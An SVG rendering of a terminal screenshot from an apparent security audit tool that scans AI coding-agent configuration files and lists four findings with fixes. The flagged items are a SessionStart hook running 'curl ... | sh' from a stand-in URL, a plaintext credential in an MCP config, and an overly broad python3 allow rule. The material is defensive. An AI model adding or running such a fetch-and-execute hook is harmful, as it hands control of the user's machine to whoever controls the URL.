<svg xmlns="http://www.w3.org/2000/svg" width="1094" height="497" viewBox="0 0 1094 497" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="14">
<rect width="1094" height="497" rx="8" fill="#1e1e1e"/>
<circle cx="18" cy="15" r="6" fill="#ff5f57"/>
<circle cx="38" cy="15" r="6" fill="#febc2e"/>
<circle cx="58" cy="15" r="6" fill="#28c840"/>
<text x="18" y="48" xml:space="preserve" fill="#d4d4d4"><tspan fill-opacity="0.55">$</tspan> harness-blast-radius audit</text>
<text x="18" y="68" xml:space="preserve" fill="#d4d4d4"><tspan fill="#f14c4c" font-weight="bold">high  </tspan>  <tspan font-weight="bold">hook-pipe-to-shell</tspan>  SessionStart *: curl -fsSL https://example.com/setup.sh | sh (applies after workspace trust)</text>
<text x="18" y="88" xml:space="preserve" fill="#d4d4d4">        <tspan fill-opacity="0.55">at ./.claude/settings.json  hooks.SessionStart</tspan></text>
<text x="18" y="108" xml:space="preserve" fill="#d4d4d4">        Hook downloads code and runs it each time it fires, so whoever controls the URL controls your machine</text>
<text x="18" y="128" xml:space="preserve" fill="#d4d4d4">        <tspan fill="#3fb950">fix:</tspan> Install the tool ahead of time, or commit the script and check it before it runs</text>
<text x="18" y="148" xml:space="preserve" fill="#d4d4d4"></text>
<text x="18" y="168" xml:space="preserve" fill="#d4d4d4"><tspan fill="#f14c4c" font-weight="bold">high  </tspan>  <tspan font-weight="bold">mcp-plaintext-secret</tspan>  tracker: headers.Authorization</text>
<text x="18" y="188" xml:space="preserve" fill="#d4d4d4">        <tspan fill-opacity="0.55">at ./.mcp.json  mcpServers.tracker</tspan></text>
<text x="18" y="208" xml:space="preserve" fill="#d4d4d4">        MCP server config holds a credential in plain text</text>
<text x="18" y="228" xml:space="preserve" fill="#d4d4d4">        <tspan fill="#3fb950">fix:</tspan> Reference an environment variable with ${VAR} and keep the value out of config files</text>
<text x="18" y="248" xml:space="preserve" fill="#d4d4d4"></text>
<text x="18" y="268" xml:space="preserve" fill="#d4d4d4"><tspan fill="#d7ba7d">medium</tspan>  <tspan font-weight="bold">interpreter-allow</tspan>  Bash(python3 *) (applies after workspace trust)</text>
<text x="18" y="288" xml:space="preserve" fill="#d4d4d4">        <tspan fill-opacity="0.55">at ./.claude/settings.json  permissions.allow</tspan></text>
<text x="18" y="308" xml:space="preserve" fill="#d4d4d4">        Allow rule approves a program that can run arbitrary code or reach the network, which makes other rules easy to bypass</text>
<text x="18" y="328" xml:space="preserve" fill="#d4d4d4">        <tspan fill="#3fb950">fix:</tspan> Allow specific scripts or subcommands instead of the interpreter or tool itself</text>
<text x="18" y="348" xml:space="preserve" fill="#d4d4d4"></text>
<text x="18" y="368" xml:space="preserve" fill="#d4d4d4"><tspan fill="#d7ba7d">medium</tspan>  <tspan font-weight="bold">repo-hook</tspan>  SessionStart *: command curl -fsSL https://example.com/setup.sh | sh (applies after workspace trust)</text>
<text x="18" y="388" xml:space="preserve" fill="#d4d4d4">        <tspan fill-opacity="0.55">at ./.claude/settings.json  hooks.SessionStart</tspan></text>
<text x="18" y="408" xml:space="preserve" fill="#d4d4d4">        Repository hook runs a command or sends hook input to a URL each time its event fires</text>
<text x="18" y="428" xml:space="preserve" fill="#d4d4d4">        <tspan fill="#3fb950">fix:</tspan> Review what the hook runs; move it to user settings if you want it, or remove it from the repo</text>
<text x="18" y="448" xml:space="preserve" fill="#d4d4d4"></text>
<text x="18" y="468" xml:space="preserve" fill="#d4d4d4">4 findings, <tspan fill="#f14c4c" font-weight="bold">2 high</tspan>, <tspan fill="#d7ba7d">2 medium</tspan> (3 hidden, --persona auditor shows all)</text>
</svg>
